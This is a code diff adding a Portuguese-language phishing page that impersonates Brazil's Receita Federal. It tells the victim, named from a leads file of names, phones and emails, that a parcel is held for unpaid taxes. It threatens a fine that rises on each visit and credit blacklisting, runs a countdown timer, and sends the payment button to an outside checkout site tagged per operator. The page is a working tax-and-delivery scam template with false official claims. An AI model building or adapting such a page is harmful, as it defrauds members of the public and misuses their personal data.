@@ -1,0 +1,367 @@
+<!DOCTYPE html><html lang="pt-br"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Notificação Receita Federal</title>
+    <link rel="icon" href="receita_federal_logo.ico" type="image/x-icon">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            background-color: #fff;
+            border-radius: 10px;
+            padding: 20px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .logo {
+            margin-bottom: 20px;
+        }
+
+        .logo img {
+            width: 200px;
+        }
+
+        .header {
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: #333;
+        }
+        .ap {
+            font-size: 16px;
+            margin-bottom: 10px;
+            color: rgb(171, 62, 62);
+        }
+
+        .header strong {
+            color: rgb(171, 62, 62); /* Nome do titular em vermelho */
+        }
+
+        .product-info {
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            font-size: 12px;
+            margin-bottom: 10px;
+        }
+
+        .product-info img {
+            width: 15px;
+            height: 15px;
+            margin-right: 5px;
+        }
+
+        .city-info {
+            margin-left: 5px;
+        }
+
+        .alert {
+            background-color: #d32f2f;
+            color: white;
+            font-weight: bold;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 15px 0;
+            font-size: 18px;
+        }
+
+        .alert-text {
+            font-size: 15px;
+        }
+
+        .tax-info {
+            margin: 20px 0;
+            text-align: left;
+        }
+
+        .tax-info p {
+            display: flex;
+            justify-content: space-between;
+            border-bottom: 1px solid #ddd;
+            padding: 8px 0;
+            margin: 0;
+            color: #333;
+        }
+
+        .total {
+            font-size: 18px;
+            font-weight: bold;
+            margin-top: 20px;
+            color: #d32f2f;
+        }
+
+        .timer {
+            color: #777;
+            margin-top: 20px;
+        }
+
+        .action-btn {
+            background-color: #00c000;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            font-size: 19px;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: background-color 0.3s;
+        }
+
+        .action-btn:hover {
+            background-color: #009e00;
+        }
+
+        .footer {
+            font-size: 12px;
+            color: #aaa;
+            margin-top: 10px;
+        }
+
+        .more-text {
+            display: none;
+            font-size: 12px;
+            color: #555;
+            margin-top: 10px;
+            text-align: center;
+        }
+
+        .red-text {
+            color: rgb(171, 62, 62);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo">
+            <img src="images/Logo_receita.png" alt="Receita Federal">
+        </div>
+        <div class="header">
+            Status do Pedido:<strong id="lead-name" class="red-text"></strong><br>
+            <p class="ap">Aguardando Pagamento</p>
+        </div>
+        <div class="product-info">
+            <img src="images/orange-alert.png" alt="Ícone Laranja">
+            Produto retido em <strong class="city-info" id="city-info">São Paulo / SP</strong>
+        </div>
+        <div class="alert" id="fine-amount">
+            SUJEITO A MULTA DE R$ 3.549,91
+        </div>
+        <div class="alert-text">
+            <p><strong>Atenção:</strong> Caso o pagamento do tributo não seja realizado para o despacho do seu pedido, uma multa será registrada no SPC/Serasa 
+            </p>
+            <p> Pague Agora! <strong id="lead-name-alert" class="red-text"></strong></p>
+        </div>
+        <div class="tax-info">
+            <p>Processamento Eletrônico <span>R$ 42,72</span></p>
+            <p>ICMS <span>R$ 21,34</span></p>
+            <p>Contribuição Federal <span>R$ 23,10</span></p>
+        </div>
+        <div class="total">
+            Total: R$ 87,16
+        </div>
+        <button class="action-btn" id="pay-button">Regularizar Tarifa!</button>
+        <div class="timer">
+            Tempo Restante: <strong id="timer">10:41:11</strong><br>
+            Não regularizar resultará em negativação.
+        </div>
+        <div class="footer">
+            Segundo a Lei Federal nº 5.021/1973.
+            <br><span id="lead-email"></span>
+            <button id="read-more-btn" style="border:none; background:none; color:rgb(132, 132, 255); text-decoration:underline; cursor:pointer;">Ler mais</button>
+        </div>
+        <div class="more-text" id="more-text">
+            <p>Esta notificação é realizada com base no artigo 145 da Constituição Federal, que determina que todos os cidadãos brasileiros são obrigados a cumprir suas obrigações fiscais. O não pagamento do tributo dentro do prazo estipulado poderá resultar em penalidades adicionais, incluindo multas e o registro de inadimplência no SPC/Serasa.</p>
+            <p>Recomendamos que o pagamento seja realizado o mais breve possível para evitar essas complicações.</p>
+        </div>
+    </div>
+
+    <script>
+        // Função para capturar o número do atendente e telefone a partir da URL no formato /tax/{attendant}{phone_number}
+        function getAttendantAndPhoneFromURL() {
+            const pathParts = window.location.pathname.split('/'); // Divide a URL pelos '/'
+            if (pathParts.length > 2) {
+                let fullPath = pathParts[2]; // O formato esperado é /tax/{attendant}{phone_number}
+                const attendantNumber = fullPath.substring(0, 1); // O primeiro caractere é o número do atendente
+                let phoneNumber = fullPath.substring(1); // O restante é o número de telefone
+        
+                // Verifica se o número do telefone começa com "55" e remove se necessário
+                if (phoneNumber.startsWith("55")) {
+                    phoneNumber = phoneNumber.substring(2);
+                }
+        
+                return { attendantNumber, phoneNumber };
+            }
+            return null;
+        }
+
+
+        // Função que retorna o nome do atendente de acordo com o número
+        function getAttendantNameByNumber(attendantNumber) {
+            switch(attendantNumber) {
+                case '1':
+                    return 'ka';
+                case '2':
+                    return 'rf';
+                case '3':
+                    return 'nk';
+                case '4':
+                    return 'ig';
+                default:
+                    return null; // Caso nenhum atendente seja identificado
+            }
+        }
+
+        let leads = [];
+
+        // Carrega o arquivo leads.json
+        fetch('leads.json')
+            .then(response => response.json())
+            .then(data => {
+                leads = data;
+        
+                // Captura o atendente e o telefone a partir da URL
+                const { attendantNumber, phoneNumber } = getAttendantAndPhoneFromURL();
+                console.log('Número do atendente da URL:', attendantNumber);
+                console.log('Número de telefone da URL:', phoneNumber);
+        
+                if (attendantNumber && phoneNumber) {
+                    // Procura o lead pelo número de telefone, com ou sem o "55"
+                    const leadInfo = leads.find(lead => String(lead.phone) === String(phoneNumber) || String(lead.phone) === `55${phoneNumber}`);
+                    console.log('Lead encontrado:', leadInfo);
+        
+                    if (leadInfo) {
+                        document.getElementById('lead-name').innerText = leadInfo.name;
+                        document.getElementById('lead-name-alert').innerText = leadInfo.name;
+                        document.getElementById('lead-email').innerText = leadInfo.email;
+        
+                        // Exibe o nome do atendente baseado no número
+                        const attendantName = getAttendantNameByNumber(attendantNumber);
+                        if (attendantName) {
+                            console.log('Atendente responsável:', attendantName);
+                        } else {
+                            console.log('Atendente não encontrado.');
+                        }
+                    } else {
+                        console.log('Lead não encontrado');
+                    }
+                } else {
+                    console.log('Número de atendente ou telefone não encontrado na URL.');
+                }
+            })
+            .catch(error => {
+                console.error('Erro ao carregar leads:', error);
+            });
+
+        // Função que retorna o número da campanha de acordo com o atendente
+        function getCampaignForAttendant(attendantNumber) {
+            switch(attendantNumber) {
+                case '1':
+                    return 'ka'; // Campanha para Kaiky
+                case '2':
+                    return 'rf'; // Campanha para Rafael
+                case '3':
+                    return 'nk'; // Campanha para Nickolas
+                case '4':
+                    return 'ig'; // Campanha para Igor
+                default:
+                    return 'ad'; // Caso nenhum atendente seja identificado, default para Igor
+            }
+        }
+
+        // Função que captura apenas o parâmetro utm_campaign (atendente)
+        function getParams() {
+            let t = "",
+                { attendantNumber } = getAttendantAndPhoneFromURL(); // Pega o número do atendente
+
+            if (attendantNumber) {
+                const campaign = getCampaignForAttendant(attendantNumber);
+                t = `?utm_campaign=${campaign}`; // Define apenas o parâmetro utm_campaign
+            } else {
+                t = `?utm_campaign=ad`; // Caso não encontre o atendente, passa utm_campaign como "ad"
+            }
+            console.log('Parâmetro UTM gerado:', t);
+            return t;
+        }
+
+        // Redireciona ao clicar no botão de pagar com apenas utm_campaign
+        document.getElementById('pay-button').addEventListener('click', function() {
+            window.location.href = 'https://pay.loggicheckout.site/nQ7kZ7yVL2Dg0eJ' + getParams();
+        });
+
+        // Timer Script
+        let timerDuration = 10 * 60 * 60 + 41 * 60 + 11; // 10 horas, 41 minutos e 11 segundos
+
+        function formatTime(seconds) {
+            const hours = Math.floor(seconds / 3600);
+            const minutes = Math.floor((seconds % 3600) / 60);
+            const secs = seconds % 60;
+            return `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
+        }
+
+        const timerElement = document.getElementById('timer');
+        const countdown = setInterval(() => {
+            if (timerDuration <= 0) {
+                clearInterval(countdown);
+                timerElement.innerHTML = "00:00:00";
+            } else {
+                timerElement.innerHTML = formatTime(timerDuration);
+                timerDuration--;
+            }
+        }, 1000);
+
+        // Multa com valor crescente
+        function updateFineAmount() {
+            let fine = parseFloat(localStorage.getItem('fineAmount')) || 3549.91;
+
+            // Incrementa em 500 até o limite de 10000
+            if (fine < 10000) {
+                fine += 152.22;
+            }
+
+            // Armazena o novo valor no localStorage
+            localStorage.setItem('fineAmount', fine);
+
+            // Atualiza o valor da multa na página
+            document.getElementById('fine-amount').innerText = `SUJEITO A MULTA DE R$ ${fine.toFixed(2)}`;
+        }
+
+        // Chama a função para atualizar a multa
+        updateFineAmount();
+
+        // Função para expandir o texto no clique do botão "Ler mais"
+        const readMoreBtn = document.getElementById('read-more-btn');
+        const moreText = document.getElementById('more-text');
+
+        readMoreBtn.addEventListener('click', function () {
+            if (moreText.style.display === 'none' || moreText.style.display === '') {
+                moreText.style.display = 'block';
+                readMoreBtn.innerText = 'Ler menos';
+            } else {
+                moreText.style.display = 'none';
+                readMoreBtn.innerText = 'Ler mais';
+            }
+        });
+
+        // Log no console
+        console.log('%cScript de rastreamento de vendas desenvolvido pela Comunidade NOD - Dericson Calari e Samuel Choairy', 'font-size:20px;color:yellow;');
+    </script>
+
+
+
+</body></html>
